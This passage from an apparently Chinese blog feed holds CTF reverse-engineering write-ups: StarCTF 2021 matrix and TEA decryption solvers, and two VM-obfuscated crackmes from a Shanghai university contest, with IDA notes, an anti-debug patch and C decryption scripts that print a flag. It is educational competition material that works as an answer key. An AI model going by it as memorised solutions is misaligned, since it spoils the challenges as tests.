list(map(ord, a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line"><span class="comment">#a = list(map(ord, a)) 很无脑的错误，不能放在这里的原因:因为如果已经转换了一次了，那就已经是int型，下一次转换就出错了。</span></span><br><span class="line"><span class="keyword">if</span> ((a[<span class="number">0</span>]*b[i] + a[<span class="number">1</span>]*b[<span class="number">5</span>+i] + a[<span class="number">2</span>]*b[<span class="number">10</span>+i] + a[<span class="number">3</span>]*b[<span class="number">15</span>+i] + a[<span class="number">4</span>]*b[<span class="number">20</span>+i])%<span class="number">257</span>) != enc[i]:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">ans = mbruteforce(check, base, <span class="number">5</span>, method=<span class="string">'fixed'</span>)</span><br></pre></td></tr></table></figure><p>最后贴一下官方放的使用sage求解，也就是带余的矩阵乘法和逆矩阵。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A = Matrix(GF(<span class="number">257</span>),[[<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>], [<span class="number">97</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">121</span>], [<span class="number">111</span>, <span class="number">117</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">117</span>], [<span class="number">114</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">114</span>], [<span class="number">105</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">125</span>]])</span><br><span class="line"></span><br><span class="line">encode =  Matrix(GF(<span class="number">257</span>),[[<span class="number">56</span>, <span class="number">109</span>, <span class="number">75</span>,<span class="number">75</span>,<span class="number">185</span>], [<span class="number">138</span> ,<span class="number">249</span>, <span class="number">138</span>, <span class="number">187</span>,  <span class="number">92</span>],[<span class="number">138</span>, <span class="number">154</span> ,<span class="number">186</span>, <span class="number">107</span>, <span class="number">210</span>],[<span class="number">198</span>, <span class="number">187</span>,   <span class="number">5</span>, <span class="number">144</span>,  <span class="number">86</span>],[<span class="number">147</span>, <span class="number">230</span>,  <span class="number">18</span>, <span class="number">189</span>,  <span class="number">79</span>]])</span><br><span class="line"></span><br><span class="line">flag = encode*A.inverse()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>这个找个在线网站解一下就好：<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">sage在线求解</a></p><p><img src="/2021/01/17/starctf2021/image-20210127153009965-1611759765185.png" alt="image-20210127153009965"></p><h3 id="Favourite-Architecture-flag0"><a href="#Favourite-Architecture-flag0" class="headerlink" title="Favourite Architecture flag0"></a>Favourite Architecture flag0</h3><p>有ghidra9.2就很简单了，查查riscv相关的指令，实在不好理解的方式调试也行。</p><p>前半段流加密，只要最后得到最后的异或值就好了。后半段一个tea加密。</p><p>这里贴下tea吧：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> key[] = &#123;<span class="number">0xbb</span>, <span class="number">0xa0</span>, <span class="number">0x68</span>, <span class="number">0x13</span>, <span class="number">0x1e</span>, <span class="number">0xce</span>, <span class="number">0x0a</span>, <span class="number">0x19</span></span><br><span class="line">, <span class="number">0x57</span>, <span class="number">0xa3</span>, <span class="number">0xd8</span>, <span class="number">0x35</span>, <span class="number">0x61</span>, <span class="number">0x2c</span>, <span class="number">0xbf</span>, <span class="number">0x26</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> enc[] = &#123;<span class="number">0xf9</span>, <span class="number">0x87</span>, <span class="number">0x50</span>, <span class="number">0xc4</span>, <span class="number">0xb2</span>, <span class="number">0xf2</span>, <span class="number">0x03</span>, <span class="number">0x07</span></span><br><span class="line">, <span class="number">0x3c</span>, <span class="number">0xf4</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x59</span>, <span class="number">0xbb</span>, <span class="number">0xb4</span>, <span class="number">0xed</span></span><br><span class="line">, <span class="number">0x2a</span>, <span class="number">0xb0</span>, <span class="number">0xf0</span>, <span class="number">0x0f</span>, <span class="number">0xf2</span>, <span class="number">0x20</span>, <span class="number">0x85</span>, <span class="number">0x00</span></span><br><span class="line">, <span class="number">0xdd</span>, <span class="number">0x23</span>, <span class="number">0xcd</span>, <span class="number">0xfd</span>, <span class="number">0x75</span>, <span class="number">0x48</span>, <span class="number">0x02</span>, <span class="number">0x35</span></span><br><span class="line">, <span class="number">0xd3</span>, <span class="number">0xb6</span>, <span class="number">0xd7</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x1b</span>, <span class="number">0xf2</span>, <span class="number">0x74</span></span><br><span class="line">, <span class="number">0x12</span>, <span class="number">0xbf</span>, <span class="number">0x2d</span>, <span class="number">0xcb</span>, <span class="number">0xf6</span>, <span class="number">0x53</span>, <span class="number">0xb4</span>, <span class="number">0xa4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(*((unsigned int *)(enc+8*i)) &gt;&gt; 5)+*((unsigned int *)key+3)^delat+*((unsigned int *)(enc+8*i))*(*((unsigned int *)(enc+8*i)))^0x10+*((unsigned int *)key+2)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> delat = <span class="number">3816266640</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>) -= (*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">3</span>)^delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)))^(*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">2</span>);</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))) -= (*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)+<span class="number">1</span>)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">1</span>)^delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>)^(*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">0</span>);</span><br><span class="line">delat += <span class="number">0x61c88647</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, enc[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第六届上海市大学生网络安全大赛</title>
      <link href="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
      <url>/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>2个虚拟机类型的题目。很高兴进了线下，队伍最后第2名/。<a id="more"></a></p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/909254_NE362J9P4YSEMAR.png" alt="909254_NE362J9P4YSEMAR"></p><h3 id="真正的Babyre"><a href="#真正的Babyre" class="headerlink" title="真正的Babyre"></a>真正的Babyre</h3><p>ida开始直接搜索字符串，找到关键函数，简单修复一下栈指针，直接F5。</p><p>开始总感觉自己看到的是假的流程，把程序翻了个遍，没发现其它的流程，但是发现了几个反调试，但是调试发现程序都没有使用。。。其中二个：</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201115110658656-1605414968987.png" alt="image-20201115110658656"></p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114231613090-1605451277739.png" alt="image-20201114231613090"></p><p>然后确定这就是一个虚拟机逆向。静态分析一下后直接让程序跑起来。</p><p>这里我做的时候和复现的时候，ida识别的竟然不一样，复现分析的更简洁。记得做的时候，每次赋值操作码与数据的时候是使用一个四字节数据来保存的，其中L0BYTE，Byte1，Byte2，HIByte都是不同的含义：</p><p>做的时候的一些笔记：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试flag。</span></span><br><span class="line">flag&#123;<span class="number">0123456789012345678901234567890</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最后比较的数据。</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">31</span>,  <span class="number">24</span>,  <span class="number">15</span>, <span class="number">250</span>, <span class="number">184</span>,  <span class="number">99</span>, <span class="number">100</span>, <span class="number">137</span>,  <span class="number">24</span>, <span class="number">104</span>, </span><br><span class="line">  <span class="number">124</span>,  <span class="number">25</span>,  <span class="number">20</span>,  <span class="number">45</span>, <span class="number">125</span>,  <span class="number">88</span>,   <span class="number">0</span>,  <span class="number">30</span>,  <span class="number">84</span>, <span class="number">106</span>, </span><br><span class="line">   <span class="number">65</span>,  <span class="number">60</span>,  <span class="number">54</span>,  <span class="number">62</span>,  <span class="number">86</span>,  <span class="number">19</span>,   <span class="number">4</span>,  <span class="number">59</span>,  <span class="number">46</span>,  <span class="number">75</span>, </span><br><span class="line">  <span class="number">121</span>,  <span class="number">67</span>, <span class="number">122</span>,  <span class="number">34</span>,  <span class="number">69</span>, <span class="number">110</span>,  <span class="number">58</span>, <span class="number">117</span>,  <span class="number">38</span>, <span class="number">200</span>, </span><br><span class="line">  <span class="number">192</span>, <span class="number">142</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LOBYTE：%<span class="number">64</span> index</span><br><span class="line">BYTE2: 开始与LOBYTE值相同，做运算完的赋值index</span><br><span class="line">BYTE1: xor input[]  opcode: <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>：BYTE1 &amp;= LOBYTE;</span><br></pre></td></tr></table></figure><p>然后程序中使用了的一个反调试（时钟检测）：简单patch了即可。</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201115001246130-1605451277740.png" alt="image-20201115001246130"></p><p>乍一看程序流程有点复杂，感觉输入的数据会应该下一步操作码，这个其实就是一个加密操作。</p><p>总结一下程序的加密操作（对所有字符串的加密都是这个操作）：首先从操作码中取出一个数据<strong>op_data</strong> ，然后temp  = input[i]^op_data，再让op_data &amp;= input[i]，input[i] = temp，一直这个循环直到op_data == 0，最后取出input[i+1]进行input[i] ^= input[i+1]。一直这样对所有的input加密2遍，就是使用op_data不同。</p><p>使用ida_python导出我们要用的op_data。</p><p>按照程序的算法，逆二次即可：第一次解密过程我进行了注释。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">31</span>,  <span class="number">24</span>,  <span class="number">15</span>, <span class="number">250</span>, <span class="number">184</span>,  <span class="number">99</span>, <span class="number">100</span>, <span class="number">137</span>,  <span class="number">24</span>, <span class="number">104</span>, </span><br><span class="line">  <span class="number">124</span>,  <span class="number">25</span>,  <span class="number">20</span>,  <span class="number">45</span>, <span class="number">125</span>,  <span class="number">88</span>,   <span class="number">0</span>,  <span class="number">30</span>,  <span class="number">84</span>, <span class="number">106</span>, </span><br><span class="line">   <span class="number">65</span>,  <span class="number">60</span>,  <span class="number">54</span>,  <span class="number">62</span>,  <span class="number">86</span>,  <span class="number">19</span>,   <span class="number">4</span>,  <span class="number">59</span>,  <span class="number">46</span>,  <span class="number">75</span>, </span><br><span class="line">  <span class="number">121</span>,  <span class="number">67</span>, <span class="number">122</span>,  <span class="number">34</span>,  <span class="number">69</span>, <span class="number">110</span>,  <span class="number">58</span>, <span class="number">117</span>,  <span class="number">38</span>, <span class="number">200</span>, </span><br><span class="line">  <span class="number">192</span>, <span class="number">142</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a1[] = &#123;<span class="number">9</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>,</span><br><span class="line"> <span class="number">4</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">9</span>,</span><br><span class="line">  <span class="number">14</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b[] = &#123;<span class="number">13</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">12</span>,</span><br><span class="line">   <span class="number">13</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">7</span>,</span><br><span class="line"> <span class="number">13</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">10</span>&#125;;</span><br><span class="line">     </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> c[] = &#123;<span class="number">3</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">228</span>, <span class="number">95</span>, <span class="number">11</span>, <span class="number">116</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">113</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">85</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">5</span>, <span class="number">94</span>, <span class="number">2</span>, <span class="number">72</span>, <span class="number">105</span>, <span class="number">91</span>, <span class="number">86</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">15</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">84</span>, <span class="number">37</span>, <span class="number">14</span>, <span class="number">94</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">88</span>, <span class="number">123</span>, <span class="number">65</span>, <span class="number">135</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*int i = 0, j = 0;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ida_chars[41] = 135;</span></span><br><span class="line"><span class="comment">for(j = 40; j &gt;= 0; j--)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">ida_chars[j] ^= ida_chars[j+1];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">for(i = 0; i &lt; 255; i++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">unsigned char temp = i, temp1 = i;</span></span><br><span class="line"><span class="comment">unsigned char a = b[j];</span></span><br><span class="line"><span class="comment">while(1)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">temp1 ^= a;</span></span><br><span class="line"><span class="comment">a &amp;= temp;</span></span><br><span class="line"><span class="comment">a *= 2;</span></span><br><span class="line"><span class="comment">temp = temp1;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if(a == 0)</span></span><br><span class="line"><span class="comment">break;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if(temp == ida_chars[j])</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">ida_chars[j] = i;</span></span><br><span class="line"><span class="comment">break;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">for(i = 0; i &lt; 42; i++)</span></span><br><span class="line"><span class="comment">printf("%d, ", ida_chars[i]);*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">c[<span class="number">41</span>] = <span class="number">125</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">40</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">c[j] ^= c[j+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> temp = i, temp1 = i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a = a1[j];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp1 ^= a;</span><br><span class="line">a &amp;= temp;</span><br><span class="line">a *= <span class="number">2</span>;</span><br><span class="line">temp = temp1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(temp == c[j])</span><br><span class="line">&#123;</span><br><span class="line">c[j] = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, c[i]);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag&#123;e1750505-7a05-4de9-a333-72ec8cd26a78&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ctfvm"><a href="#ctfvm" class="headerlink" title="ctfvm"></a>ctfvm</h3><p>从题目名字可知道是虚拟机逆向。在linux中运行一下，看见字符串信息。</p><p>ida中搜索一圈并没有发现任何相关字符串，那就是程序运行时解密出相关字符串。从入口点找到main函数，可以看到464行的代码，分支极其多。。<img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114224414324-1605451277740.png" alt="image-20201114224414324"></p><p>静态分析是不可能了，直接动调。</p><p>开始慢慢的调试看哪里解密字符串的，但实在是冗长，直接在while循环下断，然后F9一直跑，直到程序等待我们输入。</p><p>随便输入后，开始慢慢跟进熟悉一些函数的功能，发现开始就是在以此取我们输入的字符存入一个大数组中</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114225040904-1605451277740.png" alt="image-20201114225040904"></p><p>继续跟踪，分析到我们输入的字符长度要是38，虽然读取了最后的回车符，但是没有使用的。</p><p>其中程序中这个内存区域类似就是vm使用的寄存器。</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114230655880-1605451277741.png" alt="image-20201114230655880"></p><p>接下来判断我们输入最后一位是不是 ‘}‘ 字符，再把除了flag{ }中的内容复制到与程序最后做比较的字符串的下面，</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114230109551-1605451277741.png" alt="image-20201114230109551"></p><p>接着判断我们开始的5位是不是 flag{。</p><p>最后就是以此取出我们flag{}中每一位，<code>(0xFB*input[i])&amp;0xff</code>，然后以此与上面的比较字符串比较。解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[] = &#123;<span class="number">237</span>, <span class="number">6</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">252</span>, <span class="number">227</span>, <span class="number">232</span>, <span class="number">6</span>, <span class="number">237</span>, <span class="number">11</span>, <span class="number">247</span>, <span class="number">247</span>, <span class="number">22</span>, <span class="number">6</span>, <span class="number">237</span>, <span class="number">27</span>, <span class="number">12</span>, <span class="number">252</span>, <span class="number">232</span>, <span class="number">12</span>, <span class="number">242</span>, <span class="number">22</span>, <span class="number">247</span>, <span class="number">2</span>, <span class="number">242</span>, <span class="number">17</span>, <span class="number">227</span>, <span class="number">227</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">247</span>, <span class="number">252</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"flag&#123;"</span>);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">32</span>; i &lt; <span class="number">127</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((i*<span class="number">0xFB</span>)&amp;<span class="number">0xff</span>) == a[j])</span><br><span class="line"><span class="built_in">printf</span>(<span 